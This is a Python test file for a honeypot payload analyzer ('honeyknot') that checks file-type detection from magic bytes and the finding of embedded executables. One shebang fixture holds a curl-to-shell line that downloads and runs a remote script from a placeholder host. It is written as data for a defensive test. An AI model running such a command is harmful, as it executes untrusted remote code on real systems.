"""Tests for honeyknot.analyzer — file type detection and analysis."""

from honeyknot.analyzer import (
    analyze_elf,
    analyze_macho,
    analyze_payload,
    analyze_pdf,
    analyze_pe,
    analyze_shebang,
    identify_file_type,
    scan_payload,
)


class TestIdentifyFileType:
    def test_elf(self):
        assert identify_file_type(b"\x7fELF" + b"\x00" * 60) == "ELF"

    def test_pe(self):
        assert identify_file_type(b"MZ" + b"\x00" * 62) == "PE/EXE"

    def test_pdf(self):
        assert identify_file_type(b"%PDF-1.7\n") == "PDF"

    def test_ole(self):
        assert identify_file_type(b"\xd0\xcf\x11\xe0" + b"\x00" * 60) == "OLE (DOC/XLS/PPT)"

    def test_zip(self):
        assert identify_file_type(b"PK\x03\x04" + b"\x00" * 60) == "ZIP/OOXML (DOCX/XLSX/PPTX)"

    def test_png(self):
        assert identify_file_type(b"\x89PNG" + b"\x00" * 60) == "PNG"

    def test_jpeg(self):
        assert identify_file_type(b"\xff\xd8\xff\xe0" + b"\x00" * 60) == "JPEG"

    def test_gif(self):
        assert identify_file_type(b"GIF89a" + b"\x00" * 58) == "GIF"

    def test_gzip(self):
        assert identify_file_type(b"\x1f\x8b\x08" + b"\x00" * 61) == "GZIP"

    def test_rar(self):
        assert identify_file_type(b"Rar!\x1a\x07" + b"\x00" * 58) == "RAR"

    def test_7z(self):
        assert identify_file_type(b"7z\xbc\xaf\x27\x1c" + b"\x00" * 58) == "7Z"

    def test_xz(self):
        assert identify_file_type(b"\xfd7zXZ\x00" + b"\x00" * 58) == "XZ"

    def test_bzip2(self):
        assert identify_file_type(b"BZh9" + b"\x00" * 60) == "BZIP2"

    def test_cab(self):
        assert identify_file_type(b"MSCF" + b"\x00" * 60) == "CAB"

    def test_dex(self):
        assert identify_file_type(b"dex\n035\x00" + b"\x00" * 56) == "DEX (Android)"

    def test_wasm(self):
        assert identify_file_type(b"\x00asm\x01\x00\x00\x00") == "WASM"

    def test_lnk(self):
        magic = b"\x4c\x00\x00\x00\x01\x14\x02\x00"
        assert identify_file_type(magic + b"\x00" * 56) == "LNK (Windows shortcut)"

    def test_shebang(self):
        assert identify_file_type(b"#!/bin/sh\necho hi\n") == "script (shebang)"

    def test_macho_thin(self):
        assert identify_file_type(b"\xcf\xfa\xed\xfe" + b"\x00" * 60) == "Mach-O"

    def test_unknown(self):
        assert identify_file_type(b"hello world blah blah") is None

    def test_too_short(self):
        assert identify_file_type(b"hi") is None


class TestAnalyzeElf:
    def test_64bit_executable(self):
        # ELF magic + class=2(64bit) + data=1(LE) + padding + type=2(exec)
        header = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8 + b"\x02\x00" + b"\x00" * 44
        result = analyze_elf(header)
        assert result["class"] == "ELF64"
        assert result["endian"] == "little"
        assert result["elf_type"] == "executable"

    def test_32bit_shared(self):
        header = b"\x7fELF\x01\x01\x01\x00" + b"\x00" * 8 + b"\x03\x00" + b"\x00" * 44
        result = analyze_elf(header)
        assert result["class"] == "ELF32"
        assert result["elf_type"] == "shared"

    def test_big_endian(self):
        header = b"\x7fELF\x02\x02\x01\x00" + b"\x00" * 8 + b"\x00\x02" + b"\x00" * 44
        result = analyze_elf(header)
        assert result["endian"] == "big"
        assert result["elf_type"] == "executable"

    def test_short_header(self):
        result = analyze_elf(b"\x7fELF")
        assert result["type"] == "ELF"
        assert "class" not in result


class TestAnalyzePe:
    def test_valid_pe(self):
        # MZ header with PE offset at byte 60, then PE signature at that offset
        header = b"MZ" + b"\x00" * 58 + b"\x40\x00\x00\x00"  # PE offset = 0x40 = 64
        header += b"PE\x00\x00"  # PE signature at offset 64
        header += b"\x64\x86"  # machine = x86_64
        header += b"\x00" * 50
        result = analyze_pe(header)
        assert result["valid_pe"] is True
        assert result["machine"] == "x86_64"

    def test_short_header(self):
        result = analyze_pe(b"MZ" + b"\x00" * 10)
        assert result["type"] == "PE/EXE"


class TestAnalyzePdf:
    def test_version_extraction(self):
        result = analyze_pdf(b"%PDF-1.7\nsome content")
        assert result["version"] == "1.7"

    def test_version_2(self):
        result = analyze_pdf(b"%PDF-2.0\nmore stuff")
        assert result["version"] == "2.0"


class TestAnalyzePayload:
    def test_returns_none_for_unknown(self):
        assert analyze_payload(b"just some text data here") is None

    def test_returns_none_for_short_data(self):
        assert analyze_payload(b"hi") is None

    def test_elf_analysis(self):
        data = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8 + b"\x02\x00" + b"\x00" * 44
        result = analyze_payload(data)
        assert result is not None
        assert result["type"] == "ELF"
        assert result["class"] == "ELF64"

    def test_pdf_analysis(self):
        result = analyze_payload(b"%PDF-1.5\ncontent here")
        assert result is not None
        assert result["type"] == "PDF"
        assert result["version"] == "1.5"

    def test_png_basic_identification(self):
        result = analyze_payload(b"\x89PNG\r\n\x1a\n" + b"\x00" * 56)
        assert result is not None
        assert result["type"] == "PNG"

    def test_gzip_basic_identification(self):
        result = analyze_payload(b"\x1f\x8b\x08\x00" + b"\x00" * 60)
        assert result is not None
        assert result["type"] == "GZIP"


class TestAnalyzeMacho:
    def test_thin_arm64_little_endian(self):
        # magic cf fa ed fe (64-bit LE), cpu_type = 0x0100000C (arm64)
        header = b"\xcf\xfa\xed\xfe" + b"\x0c\x00\x00\x01" + b"\x00" * 20
        result = analyze_macho(header)
        assert result["type"] == "Mach-O"
        assert result["endian"] == "little"
        assert result["arch"] == "arm64"

    def test_thin_x86_big_endian(self):
        # magic fe ed fa ce (32-bit BE), cpu_type = 0x00000007 (x86)
        header = b"\xfe\xed\xfa\xce" + b"\x00\x00\x00\x07" + b"\x00" * 20
        result = analyze_macho(header)
        assert result["endian"] == "big"
        assert result["arch"] == "x86"

    def test_universal_fat(self):
        # cafebabe with a small nfat_arch is a Mach-O fat binary
        header = b"\xca\xfe\xba\xbe" + b"\x00\x00\x00\x02" + b"\x00" * 20
        result = analyze_macho(header)
        assert result["type"] == "Mach-O (universal)"
        assert result["archs"] == 2

    def test_java_class_disambiguated(self):
        # cafebabe with major_version >= 45 is a Java .class, not Mach-O
        header = b"\xca\xfe\xba\xbe" + b"\x00\x00\x00\x34" + b"\x00" * 20
        result = analyze_macho(header)
        assert result["type"] == "Java class"
        assert result["major_version"] == 52


class TestAnalyzeShebang:
    def test_interpreter_extracted(self):
        result = analyze_shebang(b"#!/usr/bin/python3 -c\nimport os\n")
        assert result["type"] == "script (shebang)"
        assert result["interpreter"] == "/usr/bin/python3 -c"

    def test_via_analyze_payload(self):
        result = analyze_payload(b"#!/bin/bash\ncurl http://x/y | sh\n")
        assert result is not None
        assert result["interpreter"] == "/bin/bash"


class TestScanPayload:
    def test_finds_elf_after_http_headers(self):
        headers = b"POST /x HTTP/1.1\r\nHost: a\r\nContent-Length: 60\r\n\r\n"
        elf = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8 + b"\x02\x00" + b"\x00" * 44
        result = scan_payload(headers + elf)
        assert result is not None
        assert result["type"] == "ELF"
        assert result["class"] == "ELF64"
        assert result["offset"] == len(headers)

    def test_finds_pe_embedded_in_frame(self):
        result = scan_payload(b"\x00\x00" * 10 + b"MZ" + b"\x00" * 62)
        assert result is not None
        assert result["type"] == "PE/EXE"
        assert result["offset"] == 20

    def test_no_hit_returns_none(self):
        assert scan_payload(b"just random text data here") is None

    def test_short_input_none(self):
        assert scan_payload(b"hi") is None
